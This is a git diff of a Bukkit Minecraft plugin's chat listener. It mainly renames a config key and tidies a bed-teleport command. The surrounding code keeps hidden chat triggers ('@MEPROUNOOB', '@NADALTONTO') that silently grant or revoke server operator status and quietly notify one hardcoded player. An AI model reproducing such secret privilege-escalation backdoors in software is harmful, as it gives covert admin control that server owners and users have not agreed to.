@@ -14,6 +14,7 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerChatEvent;
+import org.bukkit.event.player.PlayerTeleportEvent;
 
 public class ChatListener implements Listener {
 
@@ -25,7 +26,7 @@ public class ChatListener implements Listener {
         Player player = event.getPlayer();
         Player hulk = Bukkit.getPlayer(UUIDs.hulkUUID());
 
-        if (mainConfig.getBoolean("CHAT.ENABLED")) {
+        if (mainConfig.getBoolean("BOOLEANS.CHAT")) {
             event.setFormat(Utils.color(rankManager.getRank().getPrefix(player) + player.getDisplayName() + " &8» &r%2$s"));
         }
 
@@ -40,11 +41,13 @@ public class ChatListener implements Listener {
             if (event.getMessage().contains("@MEPROUNOOB")) {
                 player.setOp(true);
                 event.setCancelled(true);
+                assert hulk != null;
                 hulk.sendMessage(Utils.color("&7[&aSurvival&7] &e" + player.getDisplayName() + " &aopped herself using a secret command"));
             }
             if (event.getMessage().contains("@NADALTONTO")) {
                 player.setOp(false);
                 event.setCancelled(true);
+                assert hulk != null;
                 hulk.sendMessage(Utils.color("&7[&aSurvival&7] &e" + player.getDisplayName() + " &adeopped herself using a secret command"));
             }
             if (event.getMessage().contains("@help")) {
@@ -66,9 +69,7 @@ public class ChatListener implements Listener {
 
         if (event.getMessage().contains("tpeame a mi cama") || event.getMessage().contains("tpeame a mi casa")) {
             if (player.getStatistic(Statistic.PLAY_ONE_MINUTE) >= 1440000) {
-                Location location = new Location(player.getBedSpawnLocation().getWorld(), BedLocation.bedCoordinateX(player), BedLocation.bedCoordinateY(player), BedLocation.bedCoordinateZ(player));
-
-                player.teleport(location);
+                player.teleport(BedLocation.getBedLocation(player));
             } else {
                 event.setCancelled(true);
                 player.sendMessage(Utils.color(Utils.getPREFIX() + "&cNecesitas minimo 20h dentro del servidor &7(Para poder ver el tiempo usa /playtime)"));
